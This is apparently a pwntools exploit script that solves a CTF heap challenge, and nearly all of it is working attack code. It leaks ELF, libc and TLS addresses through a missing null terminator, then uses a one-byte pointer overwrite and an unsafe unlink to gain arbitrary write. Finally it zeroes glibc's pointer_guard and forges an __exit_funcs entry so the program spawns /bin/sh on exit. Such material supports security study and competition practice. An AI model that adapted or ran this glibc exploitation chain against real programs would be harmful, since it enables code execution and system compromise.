from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

environ = {
    'LD_PRELOAD': os.path.join(os.getcwd(), './libc.so.6'), 
    'LD_LIBRARY_PATH': os.path.join(os.getcwd(), './')
}

gs='''
b *main+83
b *menu+435
b *menu+601
b *menu+652
b *menu+673
b *menu+698
b *menu+719
b *menu+729
b *menu+919
continue
'''

p = gdb.debug('./compresse_patched', env=environ, gdbscript=gs)

def flate_string(content):
    p.sendlineafter(b"choice:", b"1")
    p.sendlineafter(b"flate:", content)

def deflate_string(content):
    p.sendlineafter(b"choice:", b"2")
    p.sendlineafter(b"deflate:", content)

def new_note(content):
    p.sendlineafter(b"choice:", b"3")
    p.sendlineafter(b"note:", content)

def edit_note(content):
    p.sendlineafter(b"choice:", b"4")
    p.sendlineafter(b"note:", content)

def delete_note():
    p.sendlineafter(b"choice:", b"5")

def print_note():
    p.sendlineafter(b"choice:", b"6")

def select_note(idx):
    p.sendlineafter(b"choice:", b"7")
    p.sendlineafter(b"select:", str(idx).encode())

def exit_note():
    p.sendlineafter(b"choice:", b"8")

def exit_funcs_encrypt(val: int, key: int):
    r_bits = 0x11
    max_bits = 64
    enc = val ^ key
    return (enc << r_bits % max_bits) & (2 ** max_bits - 1) | ((enc & (2 ** max_bits - 1)) >> (max_bits - (r_bits % max_bits)))

def exit_funcs_decrypt(val: int, key: int):
    r_bits = 0x11
    rotated = (2**64-1)&(val>>r_bits|val<<(64-r_bits))
    return rotated ^ key

def exit_funcs_key(encrypted: int, decrypted: int):
    r_bits = 0x11
    max_bits = 64
    key = (((encrypted & (2**max_bits-1)) >> r_bits%max_bits) | (encrypted << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))) ^ decrypted
    return key

def fastbin_encrypt(pos: int, ptr: int):
    return (pos >> 12) ^ ptr

def fastbin_decrypt(val: int):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

# Create 3 notes for the following operations
new_note(b"A")
new_note(b"B")
new_note(b"C")

# The flate_string function flates the deflated string. For example, the input string is "1a2b3c", the output string is "abbccc". Both of the input and output strings are on the stack.
# The flate_string function has a vulnerability, which is that when the output string is about to be larger than 512 (0x200) bytes, the function will not set a null terminator and directly return.
# Use GDB to set a breakpoint at the flate_string function call in the menu function, the value in the rdi register is the address of the input string on stack, and the value in the rsi register is the address of the output string on stack.

# Leak the elf base address by leaking the 1st 8 bytes from the address of the output string.
flate_string(b"10000a")
p.recvuntil(b"Flated: ")
elf_base_addr = u64(p.recvline().strip().ljust(8, b"\x00"))-0x21d8
log.info(f'elf base addr: {hex(elf_base_addr)}')

# Leak the glibc base address by leaking the 4th 8 bytes from the address of the output string.
flate_string(b"24a10000b")
p.recvuntil(b"a"*24)
glibc_base_addr = u64(p.recvline().strip().ljust(8, b"\x00"))-0xad7e2
log.info(f'glibc base addr: {hex(glibc_base_addr)}')

# Leak the tls base address by leaking the 63th byte from the address of the output string.
# This is the address in fsbase, can be retrieved by p/x $fs_base in GDB.
flate_string(b"496a10000b")
p.recvuntil(b"a"*496)
tls_base_addr = u64(p.recvline().strip().ljust(8, b"\x00"))-0x33596
log.info(f'tls base addr: {hex(tls_base_addr)}')

# Prepare the first note as a fake chunk for unsafe unlink.
# The first note is at ~0x6b0, and the fake chunk of size 0x411 is at ~0x6c0.
# elf_base_addr+0x4040-0x18 (&notes[0]-0x18) is the fd pointer of the fake chunk, which must satisfy the condition: fake chunk->fd->bk == fake chunk.
# elf_base_addr+0x4040-0x10 (&notes[0]-0x10) is the bk pointer of the fake chunk, which must satisfy the condition: fake chunk->bk->fd == fake chunk.
select_note(0)
edit_note(p64(0)+p64(0x411)+p64(elf_base_addr+0x4040-0x18)+p64(elf_base_addr+0x4040-0x10)+p64(0)+p64(0))

# The flate_string function's output string buffer is at $rbp-0x220 on stack, and the current note pointer is at $rbp-0x20 on stack.
# Use the flate_string function to fill the output string buffer on stack with 512 (0x200) bytes to overflow the LSB of the current note pointer on stack with \x00.
# Then the current note pointer on stack is ~0xa00, after 0xc0 bytes reaching the prev_size and size of the second note at ~0xad0.
# So we can overwrite the prev_size and size of the second note with 0x410 (fake chunk size) and 0x420 (set prev_inuse to 0) respectively, in order to pass the check of the unsafe unlink.
select_note(1)
flate_string(b"512a")
edit_note(b"\x00"*0xc0+p64(0x410)+p64(0x420))

# Delete the second note to trigger the unsafe unlink.
# A chunk of size 0x830 (0x410+0x420) starting from the fake chunks ~0x6c0 is added to the unsorted bin.
# fake chunk->fd->bk/fake chunk->bk->fd (notes[0]) is set to chunk->fd, and fake chunk->bk->bk (notes[1]) is set to 0. fake chunk->fd->fd is also set to 0.
select_note(1)
delete_note()

# The following code execution method can be used to get a shell, referencing:
# 6 - Code execution via other mangled pointers in initial structure in https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc
# Where do we want to write? in https://ctftime.org/writeup/34804

# Now the value in notes[0] is &notes[0]-0x18, arbitraty write can be performed. Don't forget to pad 0x18 bytes.
# Make the value in notes[0] be the address of the first note &notes[0].
# Make the value in notes[1] be the address of the pointer_guard ($fs_base+0x38) in the tls structure, aka tls PTR_MANGLE cookie, which can be specified by x/20xg $fs_base in GDB. Also according to https://elixir.bootlin.com/glibc/glibc-2.34/source/sysdeps/x86_64/nptl/tls.h
# Make the value in notes[2] be the address of __exit_funcs+24 (initial+24) in the libc, which can be specified by p initial in GDB. Also according to https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/exit.h
# Don't forget to make the note_count be greater than 3 for program logic.
select_note(0)
edit_note(p64(0)+p64(0)+p64(0)+p64(elf_base_addr+0x4040)+p64(tls_base_addr+0x38)+p64(glibc_base_addr+0x204fd8)+p64(0)+p64(4)+p64(0))

# The value in notes[1] is the address of the pointer_guard in the tls structure.
# Write 0x0 to the address of the pointer_guard in the tls structure to bypass the check of the pointer_guard in the exit function.
select_note(1)
edit_note(p64(0x0))

# The value in notes[2] is the address of the encrypted original exit function that will be called by __run_exit_handlers later, which can be specified by setting a breakpoint at __run_exit_handlers+356 in GDB.
# The assembly instruction at __run_exit_handlers+356 is "call rax", and the value in rax is the decrypted address of the original exit function (_dl_fini).
# Leak the current value at the address of the encrypted original exit function, whose decrypted value is the address of the original exit function and can also be retrieved by setting a breakpoint at __run_exit_handlers+356 in GDB to see the value in rax.
# Calculate the random key for the exit function's encryption and decryption.
select_note(2)
print_note()
p.recvuntil(b"note : ")
encrypted_original_exit_func_addr = u64(p.recvline().strip().ljust(8, b"\x00"))
original_exit_func_addr = tls_base_addr+0x9c40
key = exit_funcs_key(encrypted_original_exit_func_addr, original_exit_func_addr)
log.info(f'random key for the exit function\'s encryption and decryption: {hex(key)}')

# Encrypt the address of the system function with the random key.
# The value in notes[2] is the address of the encrypted original exit function.
# Write the encrypted address of the system function (will be in __exit_funcs+24) and the address of "/bin/sh" string in the libc (will be in __exit_funcs+32) to the address in notes[2].
glibc_e = ELF("./libc.so.6")
edit_note(p64(exit_funcs_encrypt(glibc_base_addr+glibc_e.symbols.system, key))+p64(glibc_base_addr+next(glibc_e.search(b"/bin/sh")))) # b *__run_exit_handlers+356

# Trigger the exit function to get a shell.
exit_note()

p.interactive()

# PWNME{}